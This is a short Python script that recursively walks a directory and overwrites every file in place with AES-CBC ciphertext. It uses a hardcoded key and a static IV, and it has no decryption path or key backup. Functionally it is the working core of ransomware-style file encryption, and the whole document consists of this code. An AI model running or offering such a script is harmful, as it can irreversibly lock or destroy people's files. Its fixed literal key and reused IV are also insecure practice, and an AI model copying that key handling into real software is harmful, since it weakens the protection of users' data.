import os
from Crypto.Cipher import AES
from Crypto.Util import Padding

def encrypt(file_path, key, iv):
    with open(file_path, 'rb') as file:
        content = file.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_content = cipher.encrypt(Padding.pad(content, AES.block_size))
    
    with open(file_path, 'wb') as file:
        file.write(encrypted_content)

def encrypt_all_files(directory, key, iv):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt(file_path, key, iv)

key = b'0123456789abcdef' # 16-byte key
iv = b'abcdef0123456789' # 16-byte iv
encrypt_all_files("/path/to/directory", key, iv)